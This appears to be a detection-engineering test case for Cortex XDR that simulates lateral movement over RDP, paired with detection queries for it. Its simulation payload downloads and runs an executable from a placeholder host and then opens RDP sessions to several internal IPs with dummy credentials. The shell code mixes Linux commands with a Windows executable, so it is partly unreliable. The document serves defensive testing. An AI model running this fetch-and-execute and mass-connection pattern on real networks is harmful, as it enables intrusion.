identity.description: A rarely-active Windows host initiates outbound RDP connections to multiple internal hosts in a short time window, mimicking lateral movement. Cortex should detect this abnormal behavior as a potential reconnaissance or exploitation attempt.

payload.code:
mkdir -p /tmp/cortexsim
wget -O /tmp/cortexsim/rdesktop.exe https://example.com/rdesktop.exe
chmod +x /tmp/cortexsim/rdesktop.exe
for ip in 10.0.1.10 10.0.1.11 10.0.1.12 10.0.1.13 10.0.1.14; do
  /tmp/cortexsim/rdesktop.exe -u user -p pass $ip -port 3389 &
done

expected_artifacts.description: Outbound RDP connections to multiple internal hosts

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Abnormal RDP Connection Behavior
biocs.description: Detection of RDP connections from a rarely-seen host to multiple internal hosts within a short time window
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389
| filter actor_process_image_name = "rdesktop.exe"
| filter agent_hostname not in ("known-host-1", "known-host-2")
| comp count() as cnt by agent_hostname, dst_ip
| comp count() as connection_count
| filter connection_count > 5

abiocs.name: Abnormal RDP connections to multiple hosts from a rarely seen host
abiocs.description: ML-based detection of RDP connections initiated by an infrequently active host to multiple internal IPs
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and dst_port = 3389
| filter agent_hostname not in ("known-host-1", "known-host-2")
| comp count() as cnt by agent_hostname
| comp count() as rdp_count
| filter rdp_count > 5
| filter agent_hostname in ("rarely-active-host")
abiocs.causality_anchor: RDP connection to multiple hosts from rarely-seen host
